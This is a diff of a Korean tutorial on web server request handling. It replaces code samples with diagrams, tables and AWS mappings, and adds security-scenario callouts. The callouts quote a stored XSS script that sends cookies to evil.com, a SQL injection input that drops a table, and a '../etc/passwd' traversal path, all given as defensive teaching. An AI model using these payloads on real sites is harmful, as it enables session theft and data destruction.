@@ -95,40 +95,27 @@ C10K 문제: 10,000 동시 연결 처리 어려움
    - HTTP 메시지 파싱
 ```
 
-**소켓 수신 대기 (listen):**
+**소켓 수신 대기 과정:**
 
-```python
-import socket
-
-# 소켓 생성
-server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-# 주소 재사용 (TIME_WAIT 대응)
-server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-
-# 바인딩
-server_socket.bind(('0.0.0.0', 80))
-
-# 리스닝 (백로그 큐: 128)
-server_socket.listen(128)
-print("Server listening on port 80...")
-
-while True:
-    # 연결 수락
-    client_socket, client_address = server_socket.accept()
-    print(f"Connection from {client_address}")
-
-    # 요청 수신
-    request = client_socket.recv(4096)
-    print(f"Request:\n{request.decode()}")
-
-    # 응답 전송
-    response = b"HTTP/1.1 200 OK\r\nContent-Length: 13\r\n\r\nHello, World!"
-    client_socket.sendall(response)
-
-    # 연결 종료
-    client_socket.close()
 ```
+1. socket() - 소켓 생성
+2. bind() - IP 주소와 포트 바인딩
+3. listen() - 대기 상태 전환, 백로그 큐 설정
+4. accept() - 연결 수락, 클라이언트 소켓 생성
+5. recv() - 요청 데이터 수신
+6. send() - 응답 데이터 전송
+7. close() - 연결 종료
+```
+
+**AWS 서비스 활용:**
+
+| 웹 서버 개념 | AWS 서비스 | 설명 |
+|-------------|-----------|------|
+| 웹 서버 호스팅 | **EC2** | 가상 서버에서 Nginx/Apache 실행 |
+| 컨테이너 호스팅 | **ECS / EKS** | 컨테이너화된 웹 서버 실행 |
+| 서버리스 | **Lambda** | 서버 관리 없이 코드 실행 |
+| 관리형 웹 앱 | **Elastic Beanstalk** | 자동 스케일링, 로드 밸런싱 |
+| 정적 호스팅 | **S3 + CloudFront** | 정적 웹사이트 호스팅 |
 
 **실무 사례 - listen 백로그 큐:**
 
@@ -352,48 +339,22 @@ Connection: keep-alive
 
 **파싱 과정:**
 
-```python
-def parse_http_request(request_bytes):
-    # 헤더와 본문 분리
-    header, _, body = request_bytes.partition(b'\r\n\r\n')
-    header_lines = header.split(b'\r\n')
-
-    # 요청 라인 파싱
-    request_line = header_lines[0].decode('utf-8')
-    method, path, version = request_line.split(' ')
-
-    # 헤더 파싱
-    headers = {}
-    for line in header_lines[1:]:
-        if b': ' in line:
-            key, value = line.decode('utf-8').split(': ', 1)
-            headers[key.lower()] = value
-
-    return {
-        'method': method,
-        'path': path,
-        'version': version,
-        'headers': headers,
-        'body': body
-    }
-
-# 사용 예시
-request = b"""GET /index.html HTTP/1.1\r
-Host: www.example.com\r
-User-Agent: Mozilla/5.0\r
-\r
-"""
-
-parsed = parse_http_request(request)
-print(parsed)
-# {
-#   'method': 'GET',
-#   'path': '/index.html',
-#   'version': 'HTTP/1.1',
-#   'headers': {'host': 'www.example.com', 'user-agent': 'Mozilla/5.0'},
-#   'body': b''
-# }
 ```
+1. 요청 라인 파싱
+   "POST /api/users HTTP/1.1" → method="POST", path="/api/users", version="HTTP/1.1"
+
+2. 헤더 파싱 (CRLF로 분리)
+   "Host: api.example.com" → headers["host"] = "api.example.com"
+   "Content-Type: application/json" → headers["content-type"] = "application/json"
+
+3. 빈 줄(CRLF CRLF)로 헤더/본문 구분
+
+4. 본문 파싱 (Content-Length만큼 읽기)
+   Content-Type에 따라 JSON, Form-data 등 파싱
+```
+
+> ⚠️ **보안 시나리오 - HTTP Request Smuggling:**
+> 프록시와 백엔드 서버가 HTTP 요청을 다르게 파싱하면 요청 스머글링 공격이 가능합니다. `Content-Length`와 `Transfer-Encoding: chunked` 헤더가 동시에 존재할 때, 서버마다 다른 해석으로 인해 공격자가 다른 사용자의 요청에 악성 데이터를 주입할 수 있습니다.
 
 ### URL 라우팅
 
@@ -407,168 +368,74 @@ print(parsed)
 파일 없음 → 404 Not Found
 ```
 
-**동적 라우팅 (Flask 예시):**
+**동적 라우팅 패턴:**
 
-```python
-from flask import Flask, request, jsonify
+```
+라우팅 유형:
+┌─────────────────┬────────────────────┬──────────────────┐
+│ 유형            │ 예시               │ 매칭             │
+├─────────────────┼────────────────────┼──────────────────┤
+│ 정적 경로       │ /api/users         │ 정확히 일치      │
+│ 동적 파라미터   │ /users/:id         │ /users/123       │
+│ 쿼리 파라미터   │ /search?q=keyword  │ URL 쿼리스트링   │
+│ 와일드카드      │ /files/*           │ /files/a/b/c     │
+│ 정규식          │ /users/[0-9]+      │ 숫자만 매칭      │
+└─────────────────┴────────────────────┴──────────────────┘
 
-app = Flask(__name__)
-
-# 정적 경로
-@app.route('/')
-def index():
-    return 'Hello, World!'
-
-# 동적 경로 (파라미터)
-@app.route('/users/<int:user_id>')
-def get_user(user_id):
-    # 데이터베이스에서 사용자 조회
-    user = db.query(f'SELECT * FROM users WHERE id={user_id}')
-    return jsonify(user)
-
-# POST 요청 처리
-@app.route('/users', methods=['POST'])
-def create_user():
-    data = request.get_json()
-    # 데이터베이스에 저장
-    user_id = db.insert('users', data)
-    return jsonify({'id': user_id}), 201
-
-# 쿼리 파라미터
-@app.route('/search')
-def search():
-    query = request.args.get('q')
-    page = request.args.get('page', 1, type=int)
-    results = db.search(query, page)
-    return jsonify(results)
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+미들웨어 체인:
+요청 → 로깅 → 인증 → 권한 확인 → 라우트 핸들러 → 응답
 ```
 
-**Express.js (Node.js) 라우팅:**
+**AWS 서비스 활용:**
 
-```javascript
-const express = require('express');
-const app = express();
+| 라우팅 개념 | AWS 서비스 | 설명 |
+|------------|-----------|------|
+| URL 라우팅 | **API Gateway** | 경로별 Lambda/HTTP 엔드포인트 매핑 |
+| 로드 밸런싱 라우팅 | **ALB** | 경로/호스트 기반 라우팅 규칙 |
+| 서버리스 API | **Lambda + API Gateway** | 경로별 함수 실행 |
+| 마이크로서비스 | **App Mesh** | 서비스 간 트래픽 라우팅 |
+| 정적 파일 라우팅 | **S3 + CloudFront** | 오리진 경로 매핑 |
 
-// JSON 파싱 미들웨어
-app.use(express.json());
-
-// 로깅 미들웨어
-app.use((req, res, next) => {
-    console.log(`${req.method} ${req.url}`);
-    next();
-});
-
-// 라우트
-app.get('/', (req, res) => {
-    res.send('Hello, World!');
-});
-
-app.get('/api/users/:id', async (req, res) => {
-    const userId = req.params.id;
-    const user = await db.query('SELECT * FROM users WHERE id = ?', [userId]);
-    res.json(user);
-});
-
-app.post('/api/users', async (req, res) => {
-    const { name, email } = req.body;
-    const result = await db.insert('INSERT INTO users (name, email) VALUES (?, ?)', [name, email]);
-    res.status(201).json({ id: result.insertId });
-});
-
-// 404 핸들러
-app.use((req, res) => {
-    res.status(404).json({ error: 'Not Found' });
-});
-
-// 에러 핸들러
-app.use((err, req, res, next) => {
-    console.error(err.stack);
-    res.status(500).json({ error: 'Internal Server Error' });
-});
-
-app.listen(3000, () => {
-    console.log('Server listening on port 3000');
-});
-```
+> ⚠️ **보안 시나리오 - 경로 순회 공격 (Path Traversal):**
+> 잘못된 라우팅 설정에서 `../../../etc/passwd` 같은 경로로 파일 시스템 접근이 가능합니다. 사용자 입력이 파일 경로에 직접 사용되면 서버의 민감한 파일이 노출될 수 있습니다.
 
 ### 요청 검증 및 보안
 
-**입력 검증:**
+**주요 보안 위협과 방어:**
 
-```python
-from flask import Flask, request, jsonify
-from marshmallow import Schema, fields, ValidationError
+| 공격 유형 | 설명 | 방어 방법 |
+|----------|------|----------|
+| **SQL Injection** | 쿼리에 악성 SQL 삽입 | 파라미터 바인딩 (Prepared Statement) |
+| **XSS** | 악성 스크립트 삽입 | HTML 이스케이프, CSP 헤더 |
+| **CSRF** | 사용자 권한으로 위조 요청 | CSRF 토큰, SameSite 쿠키 |
+| **Command Injection** | 시스템 명령어 삽입 | 입력 검증, 화이트리스트 |
 
-app = Flask(__name__)
-
-# 스키마 정의
-class UserSchema(Schema):
-    name = fields.Str(required=True, validate=lambda x: len(x) > 0)
-    email = fields.Email(required=True)
-    age = fields.Int(required=True, validate=lambda x: 0 < x < 150)
-
-user_schema = UserSchema()
-
-@app.route('/api/users', methods=['POST'])
-def create_user():
-    try:
-        # 검증
-        data = user_schema.load(request.get_json())
-
-        # DB 저장
-        user_id = db.insert('users', data)
-
-        return jsonify({'id': user_id}), 201
-
-    except ValidationError as err:
-        return jsonify({'errors': err.messages}), 400
+```
+입력 검증 흐름:
+┌────────────────────────────────────────────────────────────┐
+│ 1. 타입 검증: 숫자, 문자열, 이메일 형식 확인               │
+│ 2. 범위 검증: 길이 제한, 값 범위 확인                      │
+│ 3. 패턴 검증: 정규식으로 허용된 문자만 통과                │
+│ 4. 비즈니스 검증: 중복 확인, 권한 확인                     │
+└────────────────────────────────────────────────────────────┘
 ```
 
-**SQL 인젝션 방지:**
+**AWS 서비스 활용:**
 
-```python
-# 나쁜 예 (취약)
-user_id = request.args.get('id')
-query = f"SELECT * FROM users WHERE id = {user_id}"
-# 공격: ?id=1 OR 1=1
+| 보안 개념 | AWS 서비스 | 설명 |
+|----------|-----------|------|
+| SQL Injection 방어 | **WAF** | SQL Injection 규칙 세트 적용 |
+| XSS 방어 | **WAF** | XSS 패턴 매칭 규칙 |
+| Rate Limiting | **WAF + API Gateway** | 요청 속도 제한 |
+| 입력 검증 | **API Gateway** | 요청 검증 스키마 |
+| 봇 방어 | **WAF Bot Control** | 자동화된 공격 차단 |
+| DDoS 방어 | **Shield Advanced** | L7 DDoS 완화 |
 
-# 좋은 예 (안전)
-user_id = request.args.get('id')
-query = "SELECT * FROM users WHERE id = ?"
-cursor.execute(query, (user_id,))
-```
+> ⚠️ **보안 시나리오 - SQL Injection:**
+> `?id=1; DROP TABLE users;--` 같은 입력이 직접 쿼리에 삽입되면 데이터베이스가 삭제될 수 있습니다. 모든 사용자 입력은 파라미터 바인딩을 통해 쿼리와 분리해야 합니다.
 
-**XSS 방지:**
-
-```python
-from flask import escape
-
-@app.route('/search')
-def search():
-    query = request.args.get('q', '')
-    # HTML 이스케이프
-    safe_query = escape(query)
-    return f'<h1>Search results for: {safe_query}</h1>'
-```
-
-**CSRF 방지:**
-
-```python
-from flask_wtf.csrf import CSRFProtect
-
-app = Flask(__name__)
-app.config['SECRET_KEY'] = 'your-secret-key'
-csrf = CSRFProtect(app)
-
-@app.route('/api/users', methods=['POST'])
-@csrf.exempt  # API는 토큰 기반 인증 사용
-def create_user():
-    # ...
-    pass
-```
+> ⚠️ **보안 시나리오 - Stored XSS:**
+> 공격자가 게시판에 `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`를 저장하면, 해당 페이지를 보는 모든 사용자의 세션 쿠키가 탈취됩니다.
 
 ---
 
@@ -586,34 +453,17 @@ def create_user():
 6. 프로그램 종료
 ```
 
-**CGI 스크립트 예시 (Python):**
+**CGI 환경 변수:**
 
-```python
-#!/usr/bin/env python3
-import os
-import cgi
-
-# HTTP 헤더 출력 (필수)
-print("Content-Type: text/html\n")
-
-# HTML 출력
-print("<html>")
-print("<head><title>CGI Test</title></head>")
-print("<body>")
-print("<h1>CGI Environment Variables</h1>")
-print(f"<p>REQUEST_METHOD: {os.environ.get('REQUEST_METHOD')}</p>")
-print(f"<p>QUERY_STRING: {os.environ.get('QUERY_STRING')}</p>")
-print(f"<p>REMOTE_ADDR: {os.environ.get('REMOTE_ADDR')}</p>")
-
-# POST 데이터 처리
-if os.environ.get('REQUEST_METHOD') == 'POST':
-    form = cgi.FieldStorage()
-    name = form.getvalue('name', 'Unknown')
-    print(f"<p>Hello, {name}!</p>")
-
-print("</body>")
-print("</html>")
-```
+| 환경 변수 | 설명 | 예시 |
+|----------|------|------|
+| `REQUEST_METHOD` | HTTP 메서드 | GET, POST |
+| `QUERY_STRING` | URL 쿼리 파라미터 | name=john&age=30 |
+| `CONTENT_TYPE` | 요청 본문 타입 | application/json |
+| `CONTENT_LENGTH` | 요청 본문 길이 | 256 |
+| `REMOTE_ADDR` | 클라이언트 IP | 203.0.113.50 |
+| `HTTP_HOST` | 호스트 헤더 | www.example.com |
+| `SCRIPT_NAME` | 스크립트 경로 | /cgi-bin/script.cgi |
 
 **CGI 설정 (Apache):**
 
@@ -690,34 +540,34 @@ server {
 
 ### WSGI (Web Server Gateway Interface)
 
-**WSGI 애플리케이션 (Python):**
+**WSGI 동작 원리:**
 
-```python
-# app.py
-def application(environ, start_response):
-    """WSGI 애플리케이션"""
-    status = '200 OK'
-    headers = [('Content-Type', 'text/html; charset=utf-8')]
-    start_response(status, headers)
-
-    # 요청 정보
-    method = environ['REQUEST_METHOD']
-    path = environ['PATH_INFO']
-    query = environ.get('QUERY_STRING', '')
-
-    response = f"""
-    <html>
-    <body>
-        <h1>WSGI Application</h1>
-        <p>Method: {method}</p>
-        <p>Path: {path}</p>
-        <p>Query: {query}</p>
-    </body>
-    </html>
-    """
-
-    return [response.encode('utf-8')]
 ```
+┌─────────────────────────────────────────────────────────────┐
+│                    WSGI 인터페이스                          │
+├─────────────────────────────────────────────────────────────┤
+│ 웹 서버 (Nginx/Apache)                                      │
+│     ↓                                                       │
+│ WSGI 서버 (Gunicorn/uWSGI)                                  │
+│     ↓                                                       │
+│ WSGI 애플리케이션 (Flask/Django)                            │
+│     ↓                                                       │
+│ application(environ, start_response)                        │
+│   - environ: 요청 정보 (METHOD, PATH, QUERY_STRING 등)      │
+│   - start_response: 상태 코드, 헤더 설정 함수               │
+│   - return: 응답 본문 (iterable)                            │
+└─────────────────────────────────────────────────────────────┘
+```
+
+**AWS 서비스 활용:**
+
+| 애플리케이션 실행 방식 | AWS 서비스 | 설명 |
+|---------------------|-----------|------|
+| CGI/FastCGI | **EC2** | PHP-FPM, Perl CGI 실행 |
+| WSGI (Python) | **Elastic Beanstalk** | Gunicorn 자동 설정 |
+| 서버리스 | **Lambda** | 요청당 함수 실행 |
+| 컨테이너 | **ECS / Fargate** | Docker 컨테이너로 애플리케이션 실행 |
+| 쿠버네티스 | **EKS** | Pod 단위 애플리케이션 배포 |
 
 **Gunicorn (WSGI 서버):**
 
@@ -764,64 +614,38 @@ server {
 
 ### 비동기 처리
 
-**Node.js (비동기 I/O):**
+**동기 vs 비동기 처리:**
 
-```javascript
-const http = require('http');
-const fs = require('fs').promises;
+```
+동기 처리 (Blocking):
+┌────────────────────────────────────────────────────┐
+│ 요청1 → [처리 100ms] → 완료                        │
+│                        요청2 → [처리 100ms] → 완료 │
+│                                           요청3... │
+│ 총 시간: 200ms+ (순차 처리)                        │
+└────────────────────────────────────────────────────┘
 
-const server = http.createServer(async (req, res) => {
-    if (req.url === '/') {
-        try {
-            // 비동기 파일 읽기
-            const data = await fs.readFile('index.html', 'utf8');
-            res.writeHead(200, { 'Content-Type': 'text/html' });
-            res.end(data);
-        } catch (err) {
-            res.writeHead(500);
-            res.end('Internal Server Error');
-        }
-    } else if (req.url === '/api/data') {
-        // 비동기 데이터베이스 조회
-        const data = await db.query('SELECT * FROM users');
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify(data));
-    }
-});
-
-server.listen(3000, () => {
-    console.log('Server listening on port 3000');
-});
+비동기 처리 (Non-Blocking):
+┌────────────────────────────────────────────────────┐
+│ 요청1 → [I/O 대기] → 완료                          │
+│ 요청2 → [I/O 대기] → 완료  (동시 처리)             │
+│ 요청3 → [I/O 대기] → 완료                          │
+│ 총 시간: 100ms (병렬 처리)                         │
+└────────────────────────────────────────────────────┘
 ```
 
-**Python asyncio (비동기):**
+**비동기 처리 비교:**
 
-```python
-import asyncio
-from aiohttp import web
+| 기술 | 언어/프레임워크 | 특징 |
+|-----|----------------|------|
+| Event Loop | Node.js | 단일 스레드, 콜백 기반 |
+| asyncio | Python (aiohttp) | 코루틴 기반 비동기 |
+| Reactive | Java (WebFlux) | Publisher/Subscriber 패턴 |
+| Goroutine | Go | 경량 스레드 (그린 스레드) |
+| Actor | Erlang/Elixir | 메시지 패싱 모델 |
 
-async def handle(request):
-    name = request.match_info.get('name', 'World')
-
-    # 비동기 I/O 작업
-    await asyncio.sleep(0.1)  # 시뮬레이션
-
-    return web.Response(text=f'Hello, {name}!')
-
-async def handle_api(request):
-    # 비동기 데이터베이스 조회
-    data = await db.fetch_all('SELECT * FROM users')
-    return web.json_response(data)
-
-app = web.Application()
-app.add_routes([
-    web.get('/', handle),
-    web.get('/api/users', handle_api),
-])
-
-if __name__ == '__main__':
-    web.run_app(app, host='0.0.0.0', port=8080)
-```
+> ⚠️ **보안 시나리오 - Slowloris 공격:**
+> 비동기 서버도 커넥션 수 제한이 있습니다. 공격자가 수천 개의 연결을 열고 아주 느리게 데이터를 보내면 서버의 연결 슬롯이 고갈되어 정상 사용자가 접속할 수 없게 됩니다.
 
 ---
 
@@ -831,104 +655,60 @@ if __name__ == '__main__':
 
 **Connection Pool (연결 풀):**
 
-```python
-import pymysql
-from dbutils.pooled_db import PooledDB
+```
+연결 풀 동작:
+┌────────────────────────────────────────────────────────────┐
+│ Connection Pool (min=2, max=10)                            │
+│ ┌────┐ ┌────┐ ┌────┐ ┌────┐ ┌────┐                        │
+│ │연결1│ │연결2│ │연결3│ │연결4│ │ .. │                        │
+│ └────┘ └────┘ └────┘ └────┘ └────┘                        │
+│   ↑       ↑       ↑                                        │
+│  요청1   요청2   요청3  (연결 재사용)                       │
+└────────────────────────────────────────────────────────────┘
 
-# 연결 풀 생성
-pool = PooledDB(
-    creator=pymysql,
-    maxconnections=10,  # 최대 연결 수
-    mincached=2,  # 최소 유지 연결
-    maxcached=5,  # 최대 유지 연결
-    blocking=True,  # 연결 대기
-    host='localhost',
-    user='user',
-    password='password',
-    database='mydb',
-    charset='utf8mb4'
-)
-
-def get_user(user_id):
-    # 풀에서 연결 가져오기
-    conn = pool.connection()
-    try:
-        with conn.cursor() as cursor:
-            sql = "SELECT * FROM users WHERE id = %s"
-            cursor.execute(sql, (user_id,))
-            result = cursor.fetchone()
-            return result
-    finally:
-        # 연결 반환 (닫지 않음)
-        conn.close()
+연결 풀 없이: 요청당 연결 생성/종료 (오버헤드 큼)
+연결 풀 사용: 미리 생성된 연결 재사용 (빠름)
 ```
 
-**ORM (Object-Relational Mapping) - SQLAlchemy:**
+| 설정 항목 | 설명 | 권장 값 |
+|----------|------|--------|
+| `pool_size` | 기본 연결 수 | CPU 코어 수 × 2 |
+| `max_overflow` | 추가 허용 연결 | pool_size와 동일 |
+| `pool_timeout` | 연결 대기 시간 | 30초 |
+| `pool_recycle` | 연결 재생성 주기 | 1800초 (30분) |
 
-```python
-from sqlalchemy import create_engine, Column, Integer, String
-from sqlalchemy.ext.declarative import declarative_base
-from sqlalchemy.orm import sessionmaker
+**AWS 서비스 활용:**
 
-# 데이터베이스 연결
-engine = create_engine('mysql+pymysql://user:password@localhost/mydb',
-                       pool_size=10, max_overflow=20)
-Base = declarative_base()
-
-# 모델 정의
-class User(Base):
-    __tablename__ = 'users'
-
-    id = Column(Integer, primary_key=True)
-    name = Column(String(100))
-    email = Column(String(100), unique=True)
-    age = Column(Integer)
-
-# 세션 팩토리
-Session = sessionmaker(bind=engine)
-
-# 조회
-def get_user(user_id):
-    session = Session()
-    try:
-        user = session.query(User).filter(User.id == user_id).first()
-        return user
-    finally:
-        session.close()
-
-# 생성
-def create_user(name, email, age):
-    session = Session()
-    try:
-        user = User(name=name, email=email, age=age)
-        session.add(user)
-        session.commit()
-        return user.id
-    except Exception as e:
-        session.rollback()
-        raise
-    finally:
-        session.close()
-```
+| 데이터베이스 개념 | AWS 서비스 | 설명 |
+|-----------------|-----------|------|
+| 관계형 DB | **RDS** | MySQL, PostgreSQL, Oracle 관리형 |
+| 연결 풀링 | **RDS Proxy** | 연결 풀 자동 관리, Lambda 최적화 |
+| NoSQL | **DynamoDB** | 서버리스 키-값 저장소 |
+| 인메모리 캐시 | **ElastiCache** | Redis, Memcached |
+| 문서 DB | **DocumentDB** | MongoDB 호환 |
+| 그래프 DB | **Neptune** | 관계 기반 데이터 |
 
 ### 쿼리 최적화
 
 **N+1 문제:**
 
-```python
-# 나쁜 예 (N+1)
-users = session.query(User).all()  # 1 쿼리
-for user in users:
-    posts = user.posts  # N 쿼리 (사용자마다)
-    print(f"{user.name}: {len(posts)} posts")
+```
+N+1 문제 발생:
+┌────────────────────────────────────────────────────────────┐
+│ 1. SELECT * FROM users;                  (1 쿼리)          │
+│ 2. SELECT * FROM posts WHERE user_id=1;  (N 쿼리)          │
+│ 3. SELECT * FROM posts WHERE user_id=2;                    │
+│ 4. SELECT * FROM posts WHERE user_id=3;                    │
+│ ...                                                        │
+│ 100명 사용자 = 101개 쿼리 (심각한 성능 저하)               │
+└────────────────────────────────────────────────────────────┘
 
-# 좋은 예 (Eager Loading)
-from sqlalchemy.orm import joinedload
-
-users = session.query(User).options(joinedload(User.posts)).all()  # 1 쿼리 (JOIN)
-for user in users:
-    posts = user.posts  # 추가 쿼리 없음
-    print(f"{user.name}: {len(posts)} posts")
+해결: Eager Loading (JOIN)
+┌────────────────────────────────────────────────────────────┐
+│ SELECT * FROM users                                        │
+│ LEFT JOIN posts ON users.id = posts.user_id;               │
+│ → 1개 쿼리로 모든 데이터 조회                              │
+└────────────────────────────────────────────────────────────┘
 ```
 
 **인덱스 사용:**
@@ -945,68 +725,47 @@ CREATE INDEX idx_users_name_age ON users(name, age);
 EXPLAIN SELECT * FROM users WHERE email = 'john@example.com';
 ```
 
-**캐싱 (Redis):**
+**캐싱 전략:**
 
-```python
-import redis
-import json
+```
+Cache-Aside 패턴:
+┌────────────────────────────────────────────────────────────┐
+│ 1. 캐시 확인 (Redis GET)                                   │
+│    ├─ HIT → 캐시 데이터 반환                               │
+│    └─ MISS ↓                                               │
+│ 2. DB 조회                                                 │
+│ 3. 캐시 저장 (Redis SETEX + TTL)                           │
+│ 4. 데이터 반환                                             │
+└────────────────────────────────────────────────────────────┘
 
-r = redis.Redis(host='localhost', port=6379, decode_responses=True)
-
-def get_user_cached(user_id):
-    # 캐시 확인
-    cache_key = f'user:{user_id}'
-    cached = r.get(cache_key)
-
-    if cached:
-        return json.loads(cached)
-
-    # DB 조회
-    user = db.query(f'SELECT * FROM users WHERE id = {user_id}')
-
-    # 캐시 저장 (1시간 TTL)
-    r.setex(cache_key, 3600, json.dumps(user))
-
-    return user
-
-def invalidate_user_cache(user_id):
-    """사용자 업데이트 시 캐시 무효화"""
-    r.delete(f'user:{user_id}')
+캐시 무효화:
+- 데이터 변경 시 관련 캐시 삭제 (Cache Invalidation)
+- TTL 만료 시 자동 삭제
 ```
 
 ### 트랜잭션 처리
 
-```python
-from sqlalchemy.orm import Session
-
-def transfer_money(from_user_id, to_user_id, amount):
-    session = Session()
-    try:
-        # 트랜잭션 시작
-        from_user = session.query(User).filter(User.id == from_user_id).with_for_update().first()
-        to_user = session.query(User).filter(User.id == to_user_id).with_for_update().first()
-
-        if from_user.balance < amount:
-            raise ValueError("Insufficient balance")
-
-        # 잔액 업데이트
-        from_user.balance -= amount
-        to_user.balance += amount
-
-        # 커밋
-        session.commit()
-
-        return True
-
-    except Exception as e:
-        # 롤백
-        session.rollback()
-        print(f"Transaction failed: {e}")
-        return False
-
-    finally:
-        session.close()
 ```
+트랜잭션 ACID 속성:
+┌─────────────┬───────────────────────────────────────────┐
+│ Atomicity   │ 전체 성공 또는 전체 롤백                  │
+│ Consistency │ 트랜잭션 전후 데이터 일관성 유지          │
+│ Isolation   │ 동시 트랜잭션 간 격리                     │
+│ Durability  │ 커밋된 데이터 영구 저장                   │
+└─────────────┴───────────────────────────────────────────┘
+
+계좌 이체 예시:
+BEGIN TRANSACTION;
+  UPDATE accounts SET balance = balance - 100 WHERE id = 1;
+  UPDATE accounts SET balance = balance + 100 WHERE id = 2;
+COMMIT;  -- 둘 다 성공해야 적용
+```
+
+> ⚠️ **보안 시나리오 - 데이터베이스 연결 문자열 노출:**
+> 소스 코드에 DB 접속 정보가 하드코딩되면 Git 저장소를 통해 유출될 수 있습니다. 환경 변수나 AWS Secrets Manager 같은 비밀 관리 서비스를 사용해야 합니다.
+
+> ⚠️ **보안 시나리오 - 캐시 포이즈닝:**
+> Redis에 인증 없이 접근 가능하면 공격자가 캐시된 사용자 데이터를 조작할 수 있습니다. 캐시에 악성 데이터를 주입하면 모든 사용자에게 조작된 정보가 제공됩니다.
 
 ---
 
@@ -1030,171 +789,124 @@ def transfer_money(from_user_id, to_user_id, amount):
 | 500 | Internal Server Error | 서버 오류 |
 | 503 | Service Unavailable | 서버 과부하 |
 
-**응답 생성 (Flask):**
+**RESTful API 응답 패턴:**
 
-```python
-from flask import Flask, jsonify, request
+```
+성공 응답:
+┌────────────────────────────────────────────────────────────┐
+│ GET /api/users/123                                         │
+│ → 200 OK + { "id": 123, "name": "John" }                   │
+│                                                            │
+│ POST /api/users                                            │
+│ → 201 Created + { "id": 456 } + Location 헤더              │
+│                                                            │
+│ DELETE /api/users/123                                      │
+│ → 204 No Content (본문 없음)                               │
+└────────────────────────────────────────────────────────────┘
 
-app = Flask(__name__)
-
-@app.route('/api/users/<int:user_id>')
-def get_user(user_id):
-    user = db.get_user(user_id)
-
-    if not user:
-        return jsonify({'error': 'User not found'}), 404
-
-    return jsonify(user), 200
-
-@app.route('/api/users', methods=['POST'])
-def create_user():
-    data = request.get_json()
-
-    # 검증
-    if not data.get('email'):
-        return jsonify({'error': 'Email is required'}), 400
-
-    # 중복 확인
-    if db.user_exists(data['email']):
-        return jsonify({'error': 'Email already exists'}), 409
-
-    # 생성
-    user_id = db.create_user(data)
-
-    return jsonify({'id': user_id}), 201
-
-@app.route('/api/users/<int:user_id>', methods=['DELETE'])
-def delete_user(user_id):
-    if not db.user_exists(user_id):
-        return jsonify({'error': 'User not found'}), 404
-
-    db.delete_user(user_id)
-
-    # 본문 없음
-    return '', 204
+에러 응답:
+┌────────────────────────────────────────────────────────────┐
+│ 404 Not Found      → { "error": "User not found" }         │
+│ 400 Bad Request    → { "error": "Email is required" }      │
+│ 409 Conflict       → { "error": "Email already exists" }   │
+│ 500 Internal Error → { "error": "Server error" }           │
+└────────────────────────────────────────────────────────────┘
 ```
 
 ### 응답 헤더 설정
 
-**보안 헤더:**
+**필수 보안 헤더:**
 
-```python
-from flask import Flask, make_response
-
-app = Flask(__name__)
-
-@app.after_request
-def set_security_headers(response):
-    # XSS 방어
-    response.headers['X-Content-Type-Options'] = 'nosniff'
-    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
-    response.headers['X-XSS-Protection'] = '1; mode=block'
-
-    # HSTS (HTTPS만)
-    if request.is_secure:
-        response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
-
-    # CSP (Content Security Policy)
-    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
-
-    return response
-
-@app.route('/')
-def index():
-    resp = make_response('Hello, World!')
-
-    # 캐시 제어
-    resp.headers['Cache-Control'] = 'public, max-age=3600'
-    resp.headers['ETag'] = '"abc123"'
-
-    return resp
-```
+| 헤더 | 값 | 목적 |
+|-----|-----|-----|
+| `X-Content-Type-Options` | nosniff | MIME 스니핑 방지 |
+| `X-Frame-Options` | SAMEORIGIN | Clickjacking 방지 |
+| `X-XSS-Protection` | 1; mode=block | XSS 필터 활성화 |
+| `Strict-Transport-Security` | max-age=31536000 | HTTPS 강제 (HSTS) |
+| `Content-Security-Policy` | default-src 'self' | 리소스 로드 제한 |
 
 **CORS (Cross-Origin Resource Sharing):**
 
-```python
-from flask import Flask
-from flask_cors import CORS
-
-app = Flask(__name__)
-
-# 모든 도메인 허용 (개발 환경)
-CORS(app)
-
-# 특정 도메인만 허용 (프로덕션)
-CORS(app, origins=['https://example.com'])
-
-# 수동 설정
-@app.after_request
-def add_cors_headers(response):
-    response.headers['Access-Control-Allow-Origin'] = 'https://example.com'
-    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
-    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
-    response.headers['Access-Control-Max-Age'] = '3600'
-    return response
 ```
+CORS 동작:
+1. 브라우저가 OPTIONS 요청 (Preflight)
+2. 서버가 허용 헤더로 응답
+3. 실제 요청 진행
+
+Access-Control-Allow-Origin: https://example.com
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+Access-Control-Allow-Headers: Content-Type, Authorization
+Access-Control-Max-Age: 3600
+```
+
+**AWS 서비스 활용:**
+
+| 응답 개념 | AWS 서비스 | 설명 |
+|----------|-----------|------|
+| 보안 헤더 | **CloudFront Response Headers** | 글로벌 보안 헤더 적용 |
+| CORS | **API Gateway** | CORS 자동 설정 |
+| 캐시 헤더 | **CloudFront** | Cache-Control, ETag 관리 |
+| 응답 변환 | **Lambda@Edge** | 응답 헤더/본문 동적 수정 |
+
+> ⚠️ **보안 시나리오 - CORS 미설정:**
+> CORS 헤더 없이 API를 오픈하면 모든 도메인에서 접근 가능합니다. 공격자 사이트에서 사용자의 세션으로 API를 호출하여 민감한 정보를 탈취할 수 있습니다.
 
 ### 콘텐츠 압축
 
-**Gzip 압축:**
+**압축 알고리즘 비교:**
 
-```python
-from flask import Flask
-from flask_compress import Compress
+| 알고리즘 | 압축률 | 속도 | 브라우저 지원 |
+|---------|-------|------|--------------|
+| **Gzip** | 70-90% | 보통 | 모든 브라우저 |
+| **Brotli** | 80-95% | 느림 | 최신 브라우저 |
+| **Deflate** | 65-85% | 빠름 | 대부분 |
 
-app = Flask(__name__)
-Compress(app)  # 자동 Gzip 압축
-
-@app.route('/data')
-def get_data():
-    # 큰 JSON 응답
-    data = {'items': [{'id': i, 'name': f'Item {i}'} for i in range(10000)]}
-    return jsonify(data)  # 자동으로 Gzip 압축됨
 ```
+압축 효과:
+원본 JSON: 500 KB
+Gzip:       50 KB (90% 감소)
